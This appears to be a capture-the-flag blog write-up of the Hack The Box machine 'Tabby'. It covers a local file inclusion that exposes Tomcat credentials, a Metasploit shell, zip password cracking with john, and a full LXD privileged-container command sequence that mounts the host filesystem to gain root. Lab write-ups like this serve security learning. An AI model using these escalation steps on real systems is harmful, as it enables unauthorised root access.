---
layout: post
category: writeup
---

## Machine Info

- Name: Tabby
- Description: Tabby is a easy difficulty Linux machine. Enumeration of the website reveals a second website that is hosted on the same server under a different vhost. This website is vulnerable to Local File Inclusion. Knowledge of the OS version is used to identify the `tomcat-users.xml` file location. This file yields credentials for a Tomcat user that is authorized to use the `/manager/text` interface. This is leveraged to deploy of a war file and upload a webshell, which in turn is used to get a reverse shell. Enumeration of the filesystem reveals a password protected zip file, which can be downloaded and cracked locally. The cracked password can be used to login to the remote machine as a low privileged user. However this user is a member of the LXD group, which allows privilege escalation by creating a privileged container, into which the host&amp;amp;#039;s filesystem is mounted. Eventually, access to the remote machine is gained as `root` using SSH.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I start by checking out the 80 and 8080 ports since ssh is practically useless with creds or keys. 

I check port 80 first and see that its some megahosting website. It even has a vhost megahosting.htb domain that I needed to add to my /etc/hosts

From there I see there is a news.php file that has the file parameter that has an LFI.

I stop there and check out port 8080 and see its a tomcat instance. I need to login to access the administrator panel. I'll try to read the config file from the LFI:


![](assets/images/2024-02-03-HTB-Tabby-Writeup-image-1.png)

After some trial and error and alot of research I landed on this file:

**`/usr/share/tomcat9/etc/tomcat-users.xml`**

![](assets/images/2024-02-03-HTB-Tabby-Writeup-image-2.png)

Now I am able to login to the manager console, I'll use metasploit to get a shell now

```bash
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
tomcat
```

## Privilege Escalation

I find a zip file back up in the var/www/html/files directory. There I download it and realize its password protected. I then pass it to john and crack it:

```bash
meterpreter > ls
Listing: /tmp
=============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  8716  fil   2024-02-03 18:49:45 -0500  16162020_backup.zip
040776/rwxrwxrw-  4096  dir   2024-02-03 18:48:37 -0500  hsperfdata_tomcat
040776/rwxrwxrw-  4096  dir   2024-02-03 18:49:57 -0500  var
```

```bash
HTB john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:00 DONE (2024-02-03 18:50) 1.408g/s 14607Kp/s 14607Kc/s 14607KC/s adornadis..adamsapple:)1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

While the zip didn't have anything, I was able to su into ash with the password:

```bash
tomcat@tabby:/tmp$ su ash
su ash
Password: admin@it
```

I see that I have the lxd group

```bash
ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

On my host:

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```

On Victim host

```bash
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

```bash
ash@tabby:~$ /snap/bin/lxc exec mycontainer /bin/sh
/snap/bin/lxc exec mycontainer /bin/sh
~ # ^[[53;5Rwhoami                                                             
whoami                                                                         
root 
```

best,
gerbsec